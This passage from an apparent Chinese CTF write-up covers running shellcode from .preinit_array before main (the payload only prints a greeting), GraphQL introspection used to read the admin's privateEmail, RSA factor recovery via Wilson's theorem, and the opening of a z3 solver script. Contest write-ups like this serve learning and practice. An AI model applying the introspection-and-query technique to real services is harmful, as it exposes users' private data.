<span class="keyword">for</span> (i = count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        __fini_array_start[i]();</span><br><span class="line">    </span><br><span class="line">    _fini();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现<code>__preinit_array_start</code>中的函数指针会在初始化的时候被调用，那么接下来就是将我们的函数指针放进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((section(<span class="string">&quot;.preinit_array&quot;</span>), used)) <span class="function"><span class="keyword">static</span> <span class="title">typeof</span><span class="params">(print)</span> *preinit_p </span>= (<span class="keyword">char</span> *)print;</span><br></pre></td></tr></table></figure>
<p>然后就是写个汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line"></span><br><span class="line">    xor edx, edx</span><br><span class="line">    push edx</span><br><span class="line"></span><br><span class="line">    push 0x21</span><br><span class="line">    ; &quot;dlro&quot;</span><br><span class="line">    push 0x646c726f</span><br><span class="line">    ; &quot;w ,o&quot;</span><br><span class="line">    push 0x77202C6f</span><br><span class="line">    ; &quot;lleH&quot;</span><br><span class="line">    push 0x6c6c6548</span><br><span class="line"></span><br><span class="line">    mov ecx, esp</span><br><span class="line">    mov dl, 13</span><br><span class="line">    int 0x80                ; print Hello, world!</span><br><span class="line"></span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line"></span><br><span class="line">    int 0x80                ; exit</span><br></pre></td></tr></table></figure>
<p>编译一下，然后dump出Hex</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./print | grep &#x27;[0-9a-f]:&#x27; | grep -v &#x27;file&#x27;|cut -f2 -d:|cut -f1-6 -d&#x27; &#x27;|tr -s &#x27; &#x27;|tr &#x27;\t&#x27; &#x27; &#x27;|sed &#x27;s/ $//g&#x27;|sed &#x27;s/ /\\x/g&#x27;|paste -d &#x27;&#x27; -s | sed &#x27;s/^/&quot;/&#x27;|sed &#x27;s/$/&quot;/g&#x27;</span><br></pre></td></tr></table></figure>
<p>完整代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__attribute__ ((section (<span class="string">&quot;.init&quot;</span>))) <span class="keyword">char</span> print[] = <span class="string">&quot;\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x6a\x21\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80&quot;</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;.preinit_array&quot;</span>), used)) <span class="function"><span class="keyword">static</span> <span class="title">typeof</span><span class="params">(print)</span> *preinit_p </span>= (<span class="keyword">char</span> *)print;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="图之上的信息">图之上的信息</h2>
<p>（开始的时候懒得看文档的，毕竟#摆烂）查看文档可以发现GraphQL的Introspection操作</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">`&#123;</span></span><br><span class="line"><span class="string">  __schema &#123;</span></span><br><span class="line"><span class="string">    types &#123;</span></span><br><span class="line"><span class="string">      name</span></span><br><span class="line"><span class="string">      fields &#123;</span></span><br><span class="line"><span class="string">        name</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;`</span></span><br><span class="line">axios.post(<span class="string">&quot;/graphql&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">query</span>: query</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>查看返回结果</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;__schema&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;types&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Query&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;note&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get a specific note information&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;notes&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get notes information of a user&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get a specific user information&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GNote&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;contents&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Int&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: <span class="literal">null</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;String&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: <span class="literal">null</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GUser&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;privateEmail&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">        <span class="comment">// .........</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这下就很清晰了，我们要查询邮箱，只需要查询<code>user</code>的<code>privateEmail</code>，然后照着文档写，猜测admin就是id为1的用户</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">`&#123;</span></span><br><span class="line"><span class="string">  user(id: 1) &#123;</span></span><br><span class="line"><span class="string">    id</span></span><br><span class="line"><span class="string">    username</span></span><br><span class="line"><span class="string">    privateEmail</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;`</span>;</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<h2 id="Easy-RSA">Easy RSA</h2>
<p>我们需要解出<code>p, q</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p</span>():</span></span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class="comment"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class="line">    <span class="keyword">return</span> value_p</span><br></pre></td></tr></table></figure>
<p>注意到x是一个质数，根据Willson定理有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mtext> </mtext><mo>≡</mo><mtext> </mtext><mo>−</mo><mn>1</mn><mtext> mod </mtext><mi>x</mi></mrow><annotation encoding="application/x-tex">(x-1)!\ \equiv\ -1\ \text{mod}\ x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)!</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">x</span></span></span></span>，也即是</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>y</mi><mo stretchy="false">!</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⋯</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext> </mtext><mo>≡</mo><mtext> </mtext><mn>1</mn><mtext> mod </mtext><mi>x</mi></mrow><annotation encoding="application/x-tex">y!(-1)(y+1)\cdots(x-1)\ \equiv\ 1\ \text{mod}\ x
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">!</span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">x</span></span></span></span></span></p>
<p>只要求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⋯</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-1)(y+1)\cdots(x-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>的逆元即可</p>
<p>然后是q</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">value = [getPrime(<span class="number">256</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    value.append(sympy.nextprime(value[i - <span class="number">1</span>]))</span><br><span class="line"><span class="comment"># print(&quot;value[-1] = &quot;, value[-1])</span></span><br><span class="line"><span class="comment"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    n = n * value[i]</span><br></pre></td></tr></table></figure>
<p>根据已有信息可以倒退得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，求解方程</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>q</mi><mi>e</mi></msup><mo>≡</mo><mtext> value_q mod </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">q^e \equiv\ \text{value\_q}\ \text{mod}\ n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">value_q</span></span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span></span></p>
<p>即可，注意到这个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>是很多个质数的乘积，那么它的欧拉函数值<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">Π</mi><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)=\Pi\, \phi(p_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Π</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p>
<p>并且有如下条件成立</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mtext>value_q</mtext><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}
    (\text{value\_q}, n) = 1\\
    (e, \phi(n)) = 1
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mord text"><span class="mord">value_q</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>那么结果是好求的，只要用扩展欧几里得求到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span>，使得</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mi>u</mi><mo>+</mo><mi>v</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">eu+v\phi(n)=1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p>
<p>然后就可以得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>=</mo><msup><mtext>value_q</mtext><mi>u</mi></msup><mtext> mod </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">q = \text{value\_q}^u\ \text{mod}\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0587em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord text"><span class="mord">value_q</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7487em;"><span style="top:-3.1473em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span></p>
<p><s>接下来就靠着Copilot一顿写就好了！</s></p>
<h2 id="赛博厨房">赛博厨房</h2>
<p>这个前两个问题只要看懂题目在说什么，问题不大</p>
<h2 id="灯，等灯等灯">灯，等灯等灯</h2>
<h3 id="Level1">Level1</h3>
<p>是一个很大的同余方程组（然而当时看着题目好复杂的样子就直接开摆了）其实并不困难，现在想起来丢给数学工具大概就完事了罢！这里用z3求解器来解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">result = [</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span 